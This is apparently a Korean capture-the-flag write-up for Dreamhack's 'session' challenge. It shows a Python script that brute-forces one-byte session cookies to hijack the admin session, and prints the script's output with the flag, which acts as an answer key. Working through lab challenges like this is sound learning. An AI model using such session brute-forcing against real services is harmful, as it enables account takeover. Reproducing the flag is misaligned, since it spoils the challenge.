## session

> 문제 URL: https://dreamhack.io/wargame/challenges/266  
> 쿠키와 세션으로 인증 상태를 관리하는 간단한 로그인 서비스입니다. admin 계정으로 로그인에 성공하면 플래그를 획득할 수 있습니다.

### Solve

1. `app.py` 소스코드에서, 아래 내용은 `admin` 세션이 `os.urandom(1).hex()`의 랜덤한 값에 따라 `session_storage`에 저장됨을 알 수 있음

```python
if __name__ == '__main__':
    import os
    session_storage[os.urandom(1).hex()] = 'admin'
    print(session_storage)
    app.run(host='0.0.0.0', port=8000)
```

2. `solve.py`를 통해, 랜덤한 4byte 값을 생성해서 `admin`에 할당된 hex 값을 알아냄

```python
import requests

# 서버 URL
url = 'http://host1.dreamhack.games:17956/'

# 세션 ID는 00부터 ff까지 순차적으로 시도
for i in range(256):  # 0부터 255까지 반복 (16진수로 00부터 ff까지)
    session_id = format(i, '02x')
    cookies = {'sessionid': session_id}

    # GET 요청 보내기
    response = requests.get(url, cookies=cookies)

    # 응답 내용 출력 (로그 확인용)
    if 'flag is' in response.text:
        print(f"Found admin session! Session ID: {session_id}")
        print(response.text)
        break
```

3. `solve.py` 실행 결과

```bash
TIL\250211>python ./solve.py
Found admin session! Session ID: f3
```

```html
<!DOCTYPE html>
<html>
  <head>
    <link rel="stylesheet" href="/static/css/bootstrap.min.css" />
    <link rel="stylesheet" href="/static/css/bootstrap-theme.min.css" />
    <link rel="stylesheet" href="/static/css/non-responsive.css" />
    <title>Index Session</title>

    <style type="text/css">
      .important {
        color: #336699;
      }
    </style>
  </head>
  <body>
    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Session</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="#">About</a></li>
          </ul>

          <ul class="nav navbar-nav navbar-right">
            <li><a href="/login">Login</a></li>
          </ul>
        </div>
        <!--/.nav-collapse -->
      </div>
    </nav>
    <!--
      # default account: guest/guest
    -->
    <div class="container">
      <p class="important">Welcome !</p>

      <h3>Hello admin, flag is DH{73b3a0ebf47fd6f68ce623853c1d4f138ad91712}</h3>
    </div>
    <!-- /container -->

    <!-- Bootstrap core JavaScript -->
    <script src="/static/js/jquery.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
  </body>
</html>
```
